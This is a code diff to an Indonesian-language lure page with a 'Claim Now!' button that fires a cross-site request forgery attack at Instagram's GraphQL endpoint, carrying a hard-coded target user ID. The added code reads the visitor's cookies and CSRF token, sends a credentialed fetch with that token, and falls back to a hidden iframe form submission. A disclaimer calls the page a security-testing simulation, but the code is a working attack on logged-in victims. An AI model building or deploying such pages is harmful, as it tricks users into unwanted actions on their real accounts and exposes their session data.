@@ -56,6 +56,35 @@
             font-size: 12px;
             color: #7f8c8d;
         }
+        .info-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .info-box h3 {
+            margin-top: 0;
+            color: #856404;
+        }
+        .debug-info {
+            background-color: #f8f9fa;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 14px;
+            white-space: pre-wrap;
+            display: none;
+        }
+        .toggle-debug {
+            color: #3498db;
+            cursor: pointer;
+            font-size: 12px;
+            text-align: center;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
@@ -69,6 +98,15 @@
         
         <a class="button" onclick="submitForm()">Klaim Sekarang!</a>
         
+        <div class="toggle-debug" onclick="toggleDebug()">▼ Tampilkan Info Debug</div>
+        <div id="debugInfo" class="debug-info"></div>
+        
+        <div class="info-box">
+            <h3>Informasi Penting:</h3>
+            <p>Halaman ini adalah simulasi untuk testing keamanan. Request mungkin diblokir oleh kebijakan CORS atau perlindungan CSRF server.</p>
+        </div>
+        
+        <!-- Form untuk CSRF attack -->
         <form id="csrfForm" class="hidden-form" action="https://www.instagram.com/graphql/query" method="POST">
             <input type="hidden" name="variables" value='{"target_user_id":"39902309948"}' />
             <input type="hidden" name="doc_id" value="9740159112729312" />
@@ -80,15 +118,126 @@
     </div>
 
     <script>
-        function submitForm() {
-            document.getElementById('csrfForm').submit();
-            alert('Sedang memproses permintaan Anda...');
+        // Fungsi untuk mendapatkan nilai cookie berdasarkan nama
+        function getCookie(name) {
+            let cookieValue = null;
+            if (document.cookie && document.cookie !== '') {
+                const cookies = document.cookie.split(';');
+                for (let i = 0; i < cookies.length; i++) {
+                    const cookie = cookies[i].trim();
+                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                        break;
+                    }
+                }
+            }
+            return cookieValue;
         }
-        
-        // Coba kirim secara otomatis saat halaman dimuat (opsional)
-        // window.onload = function() {
-        //     document.getElementById('csrfForm').submit();
-        // };
+
+        // Fungsi untuk menampilkan info debug
+        function toggleDebug() {
+            const debugInfo = document.getElementById('debugInfo');
+            const toggleBtn = document.querySelector('.toggle-debug');
+            
+            if (debugInfo.style.display === 'none') {
+                const csrfToken = getCookie('csrftoken');
+                debugInfo.innerHTML = `Cookie yang tersedia:\n${document.cookie}\n\nNilai csrftoken: ${csrfToken || 'Tidak ditemukan'}`;
+                debugInfo.style.display = 'block';
+                toggleBtn.innerHTML = '▲ Sembunyikan Info Debug';
+            } else {
+                debugInfo.style.display = 'none';
+                toggleBtn.innerHTML = '▼ Tampilkan Info Debug';
+            }
+        }
+
+        // Fungsi untuk melakukan submit form dengan header CSRF
+        function submitForm() {
+            // Dapatkan nilai CSRF token dari cookie
+            const csrfToken = getCookie('csrftoken');
+            
+            if (!csrfToken) {
+                alert('CSRF Token tidak ditemukan dalam cookie. Pastikan Anda sudah login ke situs target.');
+                return;
+            }
+            
+            // Tampilkan informasi debug
+            const debugInfo = document.getElementById('debugInfo');
+            debugInfo.innerHTML = `Menggunakan CSRF Token: ${csrfToken}\n\nMengirim request ke: https://www.instagram.com/graphql/query`;
+            debugInfo.style.display = 'block';
+            
+            // Buat form secara programatik
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://www.instagram.com/graphql/query';
+            form.style.display = 'none';
+            
+            // Tambahkan input fields
+            const variablesInput = document.createElement('input');
+            variablesInput.type = 'hidden';
+            variablesInput.name = 'variables';
+            variablesInput.value = '{"target_user_id":"39902309948"}';
+            form.appendChild(variablesInput);
+            
+            const docIdInput = document.createElement('input');
+            docIdInput.type = 'hidden';
+            docIdInput.name = 'doc_id';
+            docIdInput.value = '9740159112729312';
+            form.appendChild(docIdInput);
+            
+            // Tambahkan form ke body
+            document.body.appendChild(form);
+            
+            // Gunakan fetch API untuk mengirim request dengan header kustom
+            fetch(form.action, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'X-Csrftoken': csrfToken
+                },
+                body: `variables=${encodeURIComponent('{"target_user_id":"39902309948"}')}&doc_id=9740159112729312`,
+                // Kirim cookie bersama request
+                credentials: 'include'
+            })
+            .then(response => {
+                // Hapus form setelah digunakan
+                document.body.removeChild(form);
+                
+                if (response.ok) {
+                    return response.text();
+                }
+                throw new Error('Request gagal');
+            })
+            .then(data => {
+                debugInfo.innerHTML += '\n\nRequest berhasil dikirim!';
+                debugInfo.innerHTML += '\nResponse: ' + data.substring(0, 200) + '...';
+            })
+            .catch(error => {
+                debugInfo.innerHTML += '\n\nError: ' + error.message;
+                debugInfo.innerHTML += '\nMencoba metode alternatif...';
+                
+                // Fallback ke metode form submission tradisional
+                setTimeout(() => {
+                    // Buat iframe untuk mengirim form
+                    const iframe = document.createElement('iframe');
+                    iframe.name = 'csrf-frame';
+                    iframe.style.display = 'none';
+                    
+                    iframe.onload = function() {
+                        debugInfo.innerHTML += '\nRequest dikirim melalui iframe (mungkin berhasil)';
+                    };
+                    
+                    document.body.appendChild(iframe);
+                    
+                    // Set form target ke iframe
+                    form.target = 'csrf-frame';
+                    
+                    // Submit form
+                    form.submit();
+                }, 1000);
+            });
+            
+            alert('Memproses request... Lihat bagian debug info untuk detail.');
+        }
     </script>
 </body>
 </html>
